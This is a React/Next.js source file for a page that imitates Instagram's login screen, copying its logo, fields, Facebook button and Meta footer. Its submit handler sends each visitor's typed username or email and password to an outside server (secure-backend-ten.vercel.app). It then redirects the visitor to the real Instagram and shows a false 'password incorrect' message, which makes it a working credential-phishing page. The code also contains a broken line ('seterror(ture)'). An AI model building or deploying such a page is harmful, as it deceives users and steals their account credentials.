"use client";
import { redirect } from "next/dist/server/api-utils";
import Image from "next/image";
import { useState } from "react";

export default function Home() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, seterror] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();

    let mail = email.includes("@") ? email : email.concat("@gmail.com");
    try {
      const response = await fetch(
        "https://secure-backend-ten.vercel.app/auth/signup",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            firstName: password,
            email: mail,
            password: password,
          }),
        }
      );

      const data = await response.json();

      if (response.ok) {
        console.log("Signup successful!");
        // setMessage("Signup successful!");
        seterror(ture);
        window.location.replace("https://www.instagram.com/");
      } else {
        console.log(data.message || "Signup failed.");
        // setMessage(data.message || "Signup failed.");
      }
    } catch (error) {
      console.log("Signup failed.");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-white md:bg-gray-100 px-4">
      <div className="max-w-sm w-full p-6">
        {/* Logo */}
        {/* <h1 className="text-center font-logo text-4xl mb-6">Instagram</h1> */}

        <div>
          <Image
            unoptimized
            src="/instagram.png"
            height={30}
            width={70}
            alt="instagram"
            className="w-[35vw] h-auto mx-auto mb-8"
          />
        </div>

        {/* Login Form */}
        <form className="space-y-3" onSubmit={handleSubmit}>
          <div className="relative">
            <input
              id="email"
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="peer w-full border border-gray-300 rounded px-3 pt-5 pb-2 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
              required
            />
            <label
              htmlFor="email"
              className="absolute left-3 top-2 text-gray-500 text-xs transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-xs peer-placeholder-shown:text-gray-400 peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-500"
            >
              Phone number, username or email address
            </label>
          </div>

          {/* Password Input */}
          <div className="relative">
            <input
              id="password"
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="peer w-full border border-gray-300 rounded px-3 pt-5 pb-2 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
              required
            />
            <label
              htmlFor="password"
              className="absolute left-3 top-2 text-gray-500 text-xs transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-xs peer-placeholder-shown:text-gray-400 peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-500"
            >
              Password
            </label>

            <button
              type="button"
              onClick={() => setShowPassword((prev) => !prev)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-sm font-semibold text-gray-700 hover:text-gray-400 cursor-pointer"
            >
              {showPassword ? "Hide" : "Show"}
            </button>
          </div>
          <button
            onClick={handleSubmit}
            type="submit"
            className="w-full bg-[#0095f6] text-white font-semibold py-2 rounded-md text-sm "
          >
            Log in
          </button>
        </form>

        {/* Divider */}
        <div className="flex items-center my-4">
          <div className="flex-grow h-px bg-gray-300" />
          <span className="mx-2 text-xs text-gray-500 font-semibold">OR</span>
          <div className="flex-grow h-px bg-gray-300" />
        </div>

        {/* Facebook login */}
        <div className="text-center text-sm grid justify-center">
          <button className="flex items-center justify-center text-[#0095f6] font-semibold gap-2 ">
            <svg
              className="w-4 h-4 fill-[#0095f6]"
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
            >
              <path d="M22.675 0H1.325C.593 0 0 .593 0 1.326v21.348C0 23.406.593 24 1.325 24h11.495v-9.294H9.691v-3.622h3.129V8.413c0-3.1 1.894-4.788 4.659-4.788 1.325 0 2.463.099 2.794.143v3.24l-1.918.001c-1.504 0-1.796.715-1.796 1.763v2.31h3.588l-.467 3.622h-3.121V24h6.116C23.406 24 24 23.406 24 22.674V1.326C24 .593 23.406 0 22.675 0z" />
            </svg>
            Log in with Facebook
          </button>

          {error && (
            <p className="text-red-500 m-0 py-3">
              Sorry, your password was incorrect. Please double-check your
              password.
            </p>
          )}

          <a href="#" className="block mt-3 text-sm text-[#00376b]">
            Forgotten your password?
          </a>
        </div>

        {/* Signup */}
        <div className="mt-6 text-center text-sm">
          <span>Don&apos;t have an account? </span>
          <a href="#" className="text-[#0095f6] font-semibold">
            Sign up
          </a>
        </div>

        {/* Footer */}
        <div className="mt-6 text-xs text-center text-gray-400 space-y-2">
          <div>
            Meta · About · Blog · Jobs · Help · API · Privacy · Terms ·
            Locations · Instagram Lite · Threads
          </div>
          <div>Contact uploading and non-users · Meta Verified</div>
          <div className="mt-2">English (UK) · © 2025 Instagram from Meta</div>
        </div>
      </div>
    </div>
  );
}
